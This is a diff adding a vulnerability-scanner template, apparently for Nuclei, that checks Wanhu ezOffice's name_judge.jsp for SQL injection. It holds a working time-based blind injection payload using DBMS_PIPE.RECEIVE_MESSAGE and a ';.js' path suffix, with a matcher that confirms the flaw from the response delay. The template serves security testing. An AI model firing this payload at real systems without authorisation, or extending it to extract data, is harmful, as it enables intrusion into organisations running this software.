@@ -1,0 +1,37 @@
+id: wanhu-ezoffice-name_judge-sqli
+info:
+  name: wanhu ezoffice name_judge.jsp - sqli
+  author: leadlife
+  severity: high
+  description: 漏洞位于name_judge.jsp文件中，攻击者可通过构造恶意SQL语句注入到请求参数中，导致后端数据库执行非预期的SQL命令。
+  reference: 
+    - https://mp.weixin.qq.com/s/cw4geBBWFcJO3nDshMA5HQ
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    sqlmap:
+    version:
+  tags: wanhu,sqli,oa,time,ezoffice
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        POST /defaultroot/modules/govoffice/custom_documentmanager/name_judge.jsp;.js HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 123
+
+        formType=1+AND+1337=DBMS_PIPE.RECEIVE_MESSAGE('any',5)--&govFormName=1&formId=1
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
